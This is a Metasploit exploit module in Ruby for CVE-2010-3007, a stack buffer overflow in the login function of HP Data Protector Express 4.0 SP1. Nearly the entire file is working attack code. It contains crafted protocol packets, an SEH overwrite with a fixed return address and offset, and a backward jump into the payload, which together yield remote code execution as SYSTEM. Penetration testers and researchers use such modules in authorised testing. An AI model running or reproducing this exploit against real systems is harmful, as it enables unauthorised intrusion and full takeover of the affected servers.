##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'HP Data Protector DtbClsLogin Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in HP Data Protector 4.0 SP1. The
                overflow occurs during the login process, in the DtbClsLogin function provided by
                the dpwindtb.dll component, where the Utf8Cpy (strcpy like function) is used in an
                insecure way with the username. A successful exploitation will lead to code execution
                with the privileges of the "dpwinsdr.exe" (HP Data Protector Express Domain Server
                Service) process, which runs as SYSTEM by default.
            },
            'Author'         =>
                [
                    'AbdulAziz Hariri', # Vulnerability discovery
                    'juan vazquez' # Metasploit module
                ],
            'References'     =>
                [
                    [ 'CVE', '2010-3007' ],
                    [ 'OSVDB', '67973' ],
                    [ 'BID', '43105' ],
                    [ 'URL', 'http://www.example.com/advisories/ZDI-10-174/' ],
                    [ 'URL', 'http://www.example.com/bizsupport/TechSupport/Document.jsp?objectID=c02498535' ]
                ],
            'Payload'        =>
                {
                    'Space' => 712,
                    'BadChars' => "\x00",
                    'DisableNops' => true
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    ['HP Data Protector Express 4.0 SP1 (build 43064) / Windows XP SP3',
                        {
                            'Ret' => 0x66dd3e49, # ppr from ifsutil.dll (stable over windows updates on June 26, 
2012)
                            'Offset' => 712
                        }
                    ]
                ],
            'DefaultTarget' => 0,
            'Privileged'     => true,
            'DisclosureDate' => 'Sep 09 2010'
            ))
        register_options(
            [
                Opt::RPORT(3817),
            ], self.class)
    end
 
    def check
        connect
 
        machine_name = rand_text_alpha(15)
 
        print_status("#{sock.peerinfo} - Sending Hello Request")
        hello =  "\x54\x84\x00\x00\x00\x00\x00\x00" << "\x00\x01\x00\x00\x92\x00\x00\x00"
        hello << "\x3a\x53\xa5\x71\x02\x40\x80\x00" << "\x89\xff\xb5\x00\x9b\xe8\x9a\x00"
        hello << "\x01\x00\x00\x00\xc0\xa8\x01\x86" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x00\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x01\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00"
        hello << machine_name << "\x00"
        hello << "\x5b\x2e\xad\x71\xb0\x02\x00\x00" << "\xff\xff\x00\x00\x06\x10\x00\x44"
        hello << "\x74\x62\x3a\x20\x43\x6f\x6e\x74" << "\x65\x78\x74\x00\xe8\xc1\x08\x10"
        hello << "\xb0\x02\x00\x00\xff\xff\x00\x00" << "\x06\x10\x00\x00\x7c\xfa"
 
        sock.put(hello)
        hello_response = sock.get
        disconnect
 
        if hello_response and hello_response =~ /Dtb: Context/
            return Exploit::CheckCode::Detected
        end
 
        return Exploit::CheckCode::Safe
 
    end
 
    def exploit
 
        connect
 
        machine_name = rand_text_alpha(15)
 
        print_status("#{sock.peerinfo} - Sending Hello Request")
        hello =  "\x54\x84\x00\x00\x00\x00\x00\x00" << "\x00\x01\x00\x00\x92\x00\x00\x00"
        hello << "\x3a\x53\xa5\x71\x02\x40\x80\x00" << "\x89\xff\xb5\x00\x9b\xe8\x9a\x00"
        hello << "\x01\x00\x00\x00\xc0\xa8\x01\x86" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x00\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00\x01\x00\x00\x00" << "\x00\x00\x00\x00\x00\x00\x00\x00"
        hello << "\x00\x00\x00\x00"
        hello << machine_name << "\x00"
        hello << "\x5b\x2e\xad\x71\xb0\x02\x00\x00" << "\xff\xff\x00\x00\x06\x10\x00\x44"
        hello << "\x74\x62\x3a\x20\x43\x6f\x6e\x74" << "\x65\x78\x74\x00\xe8\xc1\x08\x10"
        hello << "\xb0\x02\x00\x00\xff\xff\x00\x00" << "\x06\x10\x00\x00\x7c\xfa"
 
        sock.put(hello)
        hello_response = sock.get
 
        if not hello_response or hello_response.empty?
            print_error("#{sock.peerinfo} - The Hello Request hasn't received a response")
            return
        end
 
        bof = payload.encoded
        bof << rand_text(target['Offset']-bof.length)
        bof << generate_seh_record(target.ret)
        bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{target['Offset']+8}").encode_string
        # The line below is used to trigger exception, don't go confused because of the big space,
        # there are only some available bytes until the end of the stack, it allows to assure exception
        # when there are mappings for dynamic memory after the stack, so to assure reliability it's better
        # to jump back.
        bof << rand_text(100000)
 
        header =  [0x8451].pack("V") # packet id
        header << [0x32020202].pack("V") # svc id
        header << [0x00000018].pack("V") # cmd id
        header << [0].pack("V") # pkt length, calculated after pkt has been built
        header << "\x00\x00\x00\x00" # ?Unknown?
 
        pkt_auth = header
        pkt_auth << bof # username
 
        pkt_auth[12, 4] = [pkt_auth.length].pack("V")
 
        print_status("#{sock.peerinfo} - Sending Authentication Request")
 
        sock.put(pkt_auth)
        disconnect
    end
end
